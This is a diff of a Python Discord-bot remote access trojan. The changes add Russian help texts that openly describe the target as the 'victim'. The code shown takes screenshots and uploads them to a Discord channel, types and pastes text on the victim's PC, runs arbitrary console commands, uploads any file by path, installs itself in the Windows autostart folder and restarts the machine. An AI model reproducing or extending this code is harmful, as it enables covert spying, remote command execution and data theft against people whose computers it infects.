@@ -32,7 +32,7 @@ async def on_ready():
 		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
 	await channel.send(embed=embed)
 
-@client.command()
+@client.command(help="Сделать скриншот")
 async def screenshot(ctx):
 	screenshot = pyautogui.screenshot()
 	channel = client.get_channel(id)
@@ -41,13 +41,14 @@ async def screenshot(ctx):
 		file = discord.File(f, filename='screenshot.png')
 		await channel.send(file=file)
 	os.remove('screenshot.png')
-@client.command()
+
+@client.command(help="Сделать поп-ап на ПК жертвы")
 async def alert(ctx, *, message):
 	channel = client.get_channel(id)
 	pyautogui.alert(message)
 	await channel.send('Отправил сообщение!')
 
-@client.command()
+@client.command(help="Написать и отправить сообщение")
 async def write(ctx, *, message):
 	channel = client.get_channel(id)
 	await channel.send("Пишу")
@@ -55,26 +56,26 @@ async def write(ctx, *, message):
 	pyautogui.press('enter')
 	await channel.send(f"Написал и отправил **{message}**")
 
-@client.command()
+@client.command(help="Скопировать текст")
 async def copy_text(ctx):
 	channel = client.get_channel(id)
 	pyautogui.hotkey('ctrl', 'a')
 	pyautogui.hotkey('ctrl', 'c')
 	await channel.send('Скопировал текст в клипборд Жертвы')
 
-@client.command()
+@client.command(help="Вставить текст")
 async def paste_text(ctx):
 	pyautogui.hotkey('ctrl', 'v')
 	pyautogui.press('enter')
 
-@client.command()
+@client.command(help="Открыть веб страницу")
 async def web(ctx, *, message):
 	channel = client.get_channel(id)
 	message_client = await channel.send(f'Открываю https://{message}')
 	webbrowser.open("https://" + message)
 	await message_client.edit(f"Открыл https://{message}")
 
-@client.command()
+@client.command(help="Посмотреть информацию об устройстве")
 async def device(ctx):
 	channel = client.get_channel(id)
 	if platform.system() == 'Windows':
@@ -88,14 +89,14 @@ async def device(ctx):
 		embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
 	await channel.send(embed=embed)
 
-@client.command()
+@client.command(help="Отключиться (если уж надоело)")
 async def disconnect(ctx):
 	channel = client.get_channel(id)
 	pyautogui.alert(text='Ты свободен... Разраб извеняется перед тобой если что)', title='ББ', button='ББ')
 	await channel.send('Я оффнулся')
 	sys.exit(0)
 
-@client.command()
+@client.command(help="Выполнить что то в консоли")
 async def console(ctx, *, command):
 	channel = client.get_channel(id)
 
@@ -107,14 +108,14 @@ async def console(ctx, *, command):
 		await channel.send(file=file)
 	os.remove('console.txt')
 
-@client.command()
+@client.command(help="Отправить файл")
 async def file(ctx, *, path):
 	channel = client.get_channel(id)
 	with open(path, 'rb') as f:
 		file = discord.File(f, filename=f'{path}')
 		await channel.send(file=file)
 
-@client.command()
+@client.command(help="Скопировать файл в Автозапуск")
 async def autostart(ctx):
 	channel = client.get_channel(id)
 	roaming = os.getenv("appdata")
@@ -124,7 +125,7 @@ async def autostart(ctx):
 
 	await channel.send('Закинул скрипт в папку Авто Запуска')
 
-@client.command()
+@client.command(help="Перезагрузить ПК")
 async def restart(ctx, *, answer = None):
 	channel = client.get_channel(id)
 
@@ -138,4 +139,4 @@ async def restart(ctx, *, answer = None):
 
 
 
-client.run('discord_bot_token_here')
+client.run('discord_bot_token')
